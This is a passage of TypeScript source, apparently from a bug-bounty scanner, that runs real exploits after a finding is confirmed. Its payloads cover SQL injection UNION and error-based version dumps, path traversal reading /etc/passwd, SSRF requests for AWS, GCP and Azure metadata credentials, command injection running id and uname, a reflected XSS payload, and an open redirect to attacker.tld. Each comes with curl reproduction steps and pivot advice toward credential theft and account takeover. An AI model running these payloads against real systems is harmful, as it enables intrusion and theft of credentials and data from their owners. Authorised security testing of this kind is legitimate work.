- CWE: ${finding.cwe || "N/A"}
- OWASP: https://owasp.org/www-project-top-ten/
`;
}

// ═════════════════════════════════════════════════════════════════════════════
// EXPLOITATION & EXTRACTION ENGINE
// ─────────────────────────────────────────────────────────────────────────────
// After the oracle confirms a vulnerability, this engine executes a *real*
// exploit (read-only / non-destructive) to extract the kind of sensitive proof
// that bug-bounty triagers (HackerOne, Bugcrowd) demand: DB version + a row
// sample for SQLi, /etc/passwd contents for LFI, IMDS token + IAM creds for
// SSRF, command output for RCE, etc. The extracted data is stored in
// finding_exploit_proofs (admin-only RLS) — never returned to the requester.
// ═════════════════════════════════════════════════════════════════════════════

interface ExploitProof {
  vulnClass: string;
  technique: string;
  exploited: boolean;
  sensitivity: "public" | "sensitive" | "highly_sensitive";
  requestDump: string;
  responseDump: string;
  extractedData: Record<string, unknown>;
  summary: string;
  reproductionSteps: string;
}

async function rawProbe(url: string, method = "GET", body?: string, headers?: Record<string,string>) {
  try {
    const u = new URL(url);
    if (isPrivateHost(u.hostname)) {
      return { status: 0, body: "[BLOCKED PRIVATE HOST]", headers: {} as Record<string,string>, ms: 0 };
    }
  } catch { return { status: 0, body: "[INVALID URL]", headers: {} as Record<string,string>, ms: 0 }; }

  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 15000);
  const start = Date.now();
  try {
    const r = await fetch(url, {
      method,
      headers: { "User-Agent": "OmniSec-Exploit/1.0", "Accept": "*/*", ...(headers || {}) },
      body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
      redirect: "manual",
      signal: ctrl.signal,
    });
    clearTimeout(t);
    const text = await r.text().catch(() => "");
    return { status: r.status, body: text, headers: Object.fromEntries(r.headers.entries()), ms: Date.now() - start };
  } catch (e: any) {
    clearTimeout(t);
    return { status: 0, body: `[network error: ${e.message || e}]`, headers: {} as Record<string,string>, ms: Date.now() - start };
  }
}

async function exploitAndExtract(finding: any): Promise<ExploitProof> {
  const endpoint = finding.endpoint || "";
  const category = String(finding.category || "").toLowerCase();
  const cwe = String(finding.cwe || "");
  const param = finding.vulnerable_parameter || finding.parameter;
  const method = (finding.method || "GET").toUpperCase();

  // ── SQL INJECTION → extract version + a row ─────────────────────────
  if (cwe.includes("89") || category === "sqli" || category === "sql") {
    const payloads = [
      // Generic UNION select probes (param count guess)
      "1' UNION SELECT NULL,version(),current_user,current_database()-- -",
      "1' UNION SELECT NULL,@@version,user(),database()-- -",
      "1' UNION SELECT NULL,banner FROM v$version-- -",
      "1)) UNION SELECT NULL,version(),current_user,current_database()-- -",
    ];
    let best: { url: string; resp: any; payload: string } | null = null;
    for (const p of payloads) {
      const url = injectParam(endpoint, p, param);
      const resp = await rawProbe(url, method);
      if (/postgres|mysql|mariadb|sqlite|oracle|sql server|microsoft/i.test(resp.body)) {
        best = { url, resp, payload: p }; break;
      }
    }
    if (!best) {
      // Error-based fallback
      const url = injectParam(endpoint, "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -", param);
      const resp = await rawProbe(url, method);
      if (/version|extractvalue|sql/i.test(resp.body)) best = { url, resp, payload: "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -" };
    }
    if (best) {
      const versionMatch = best.resp.body.match(/(MySQL|PostgreSQL|MariaDB|SQLite|Oracle|Microsoft SQL Server)[^<\n"]{0,120}/i)?.[0];
      return {
        vulnClass: "SQL Injection",
        technique: "UNION/error-based version + identity extraction",
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `${method} ${best.url}\nUser-Agent: OmniSec-Exploit/1.0`,
        responseDump: best.resp.body.slice(0, 4000),
        extractedData: {
          db_banner: versionMatch || "(present in body)",
          payload: best.payload,
          status: best.resp.status,
        },
        summary: `Database banner extracted${versionMatch ? `: ${versionMatch.slice(0,80)}` : ""}`,
        reproductionSteps: `1. curl "${best.url}"\n2. Observe DB version & current user reflected in HTTP body.\n3. Pivot to data extraction with information_schema.tables.`,
      };
    }
  }

  // ── LFI / Path traversal → grab /etc/passwd + win.ini ───────────────
  if (cwe.includes("22") || category === "traversal" || category === "lfi") {
    const variants = [
      "../../../../../../etc/passwd",
      "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
      "....//....//....//etc/passwd",
      "/etc/passwd",
      "../../../../../../windows/win.ini",
    ];
    for (const v of variants) {
      const url = injectParam(endpoint, v, param);
      const r = await rawProbe(url, method);
      if (/root:[x*]:0:0:/i.test(r.body) || /\[fonts\]|\[extensions\]/i.test(r.body)) {
        const lines = r.body.split("\n").filter(l => /:[x*]:\d+:\d+:/.test(l)).slice(0, 25);
        return {
          vulnClass: "Local File Inclusion",
          technique: "Path traversal /etc/passwd extraction",
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${url}`,
          responseDump: r.body.slice(0, 4000),
          extractedData: { payload: v, sample_users: lines, status: r.status },
          summary: `${lines.length} system user accounts read from /etc/passwd`,
          reproductionSteps: `1. curl "${url}"\n2. Observe Unix passwd entries (root:x:0:0:...) in response.\n3. Pivot to /proc/self/environ, app config, SSH keys.`,
        };
      }
    }
  }

  // ── SSRF → fetch IMDSv2 token + IAM creds (AWS), GCP/Azure metadata ──
  if (category === "ssrf" || cwe.includes("918")) {
    const ssrfTargets = [
      { url: "http://169.254.169.254/latest/api/token", method: "PUT", headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" }, label: "AWS IMDSv2 token" },
      { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", method: "GET", label: "AWS IAM role enum" },
      { url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", method: "GET", headers: { "Metadata-Flavor": "Google" }, label: "GCP SA token" },
      { url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", method: "GET", headers: { Metadata: "true" }, label: "Azure managed identity token" },
    ];
    for (const t of ssrfTargets) {
      const url = injectParam(endpoint, t.url, param || "url");
      const r = await rawProbe(url, method, undefined, t.headers);
      const looksLikeToken = /access_token|AccessKeyId|SecretAccessKey|Token|expires_in|InstanceProfile|RoleArn/i.test(r.body);
      if (looksLikeToken || (t.label.includes("IAM role enum") && r.status === 200 && r.body.trim().length > 0 && r.body.length < 200)) {
        return {
          vulnClass: "SSRF → Cloud Metadata",
          technique: t.label,
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${url}\n${Object.entries(t.headers || {}).map(([k,v])=>`${k}: ${v}`).join("\n")}`,
          responseDump: r.body.slice(0, 4000),
          extractedData: { ssrf_target: t.url, label: t.label, status: r.status, body_excerpt: r.body.slice(0, 1500) },
          summary: `Cloud metadata reachable via SSRF — ${t.label}`,
          reproductionSteps: `1. Send request: ${method} ${url}\n2. Server-side fetch reaches ${t.url}\n3. Cloud credentials/tokens returned in body — pivot to cloud account takeover.`,
        };
      }
    }
  }

  // ── Command Injection → extract uname -a / whoami / id ───────────────
  if (cwe.includes("78") || category === "cmdi" || category === "rce") {
    const marker = `OMS${Math.random().toString(36).slice(2,8).toUpperCase()}`;
    const variants = [
      `;echo ${marker};id;uname -a;`,
      `&& echo ${marker} && id && uname -a`,
      `| echo ${marker};id;uname -a`,
      `\`echo ${marker};id;uname -a\``,
      `$(echo ${marker};id;uname -a)`,
      `& echo ${marker} & whoami & ver`, // Windows
    ];
    for (const v of variants) {
      const url = injectParam(endpoint, v, param);
      const r = await rawProbe(url, method);
      if (r.body.includes(marker)) {
        const idLine = r.body.match(/uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^<\n"]{0,200}/i)?.[0];
        const uname = r.body.match(/Linux [^<\n"]{0,200}|Microsoft Windows [^<\n"]{0,200}/i)?.[0];
        return {
          vulnClass: "OS Command Injection",
          technique: "Output-confirmed RCE via shell metacharacters",
          exploited: true,
          sensitivity: "highly_sensitive",
          requestDump: `${method} ${url}`,
          responseDump: r.body.slice(0, 4000),
          extractedData: { marker, payload: v, id_output: idLine, uname_output: uname, status: r.status },
          summary: `RCE confirmed — ${idLine || "marker echoed"}${uname ? " | " + uname : ""}`,
          reproductionSteps: `1. curl "${url}"\n2. Marker "${marker}" appears in response body alongside system command output.\n3. Pivot: read source, exfil env vars, lateral movement.`,
        };
      }
    }
  }

  // ── XSS → reflected payload context ─────────────────────────────────
  if (cwe.includes("79") || category === "xss") {
    const marker = `xss${Math.random().toString(36).slice(2,8)}`;
    const payload = `"><svg/onload=alert('${marker}')>`;
    const url = injectParam(endpoint, payload, param);
    const r = await rawProbe(url, method);
    if (r.body.includes(payload) || r.body.includes(`onload=alert('${marker}')`)) {
      return {
        vulnClass: "Cross-Site Scripting",
        technique: "Reflected payload — raw HTML context",
        exploited: true,
        sensitivity: "sensitive",
        requestDump: `${method} ${url}`,
        responseDump: r.body.slice(0, 4000),
        extractedData: { marker, payload, status: r.status, content_type: r.headers["content-type"] },
        summary: `Payload reflected unencoded — JS execution context confirmed`,
        reproductionSteps: `1. Open in browser: ${url}\n2. Alert dialog with marker "${marker}" fires.\n3. Pivot: cookie theft, session hijack, CSRF chain.`,
      };
    }
  }

  // ── Open Redirect → follow Location ─────────────────────────────────
  if (cwe.includes("601") || category === "redirect") {
    const evil = "https://attacker.tld/poc";
    const url = injectParam(endpoint, evil, param || "url");
    const r = await rawProbe(url, method);
    const loc = r.headers["location"] || "";
    if (r.status >= 300 && r.status < 400 && loc.includes("attacker.tld")) {
      return {
        vulnClass: "Open Redirect",
        technique: "Location header reflection",
        exploited: true,
        sensitivity: "sensitive",
        requestDump: `${method} ${url}`,
        responseDump: `HTTP ${r.status}\nLocation: ${loc}\n\n${r.body.slice(0,1000)}`,
        extractedData: { status: r.status, location: loc },
        summary: `Server returned ${r.status} → ${loc}`,
        reproductionSteps: `1. curl -i "${url}"\n2. Note 3xx with attacker-controlled Location.\n3. Phishing pivot or OAuth code theft.`,
      };
    }
  }

  // ── Generic fallback: re-issue payload, store full request/response ──
  const fallbackUrl = finding.payload ? injectParam(endpoint, finding.payload, param) : endpoint;
  const r = await rawProbe(fallbackUrl, method);
  return {
    vulnClass: finding.title || "Unknown",
    technique: "Replay original payload",
    exploited: false,
    sensitivity: "sensitive",
    requestDump: `${method} ${fallbackUrl}`,
    responseDump: r.body.slice(0, 4000),
    extractedData: { status: r.status, content_type: r.headers["content-type"] },
    summary: "Could not auto-extract sensitive data — manual exploitation required.",
    reproductionSteps: `1. curl "${fallbackUrl}"\n2. Compare to recorded evidence: ${finding.evidence || "n/a"}.`,
  };
}
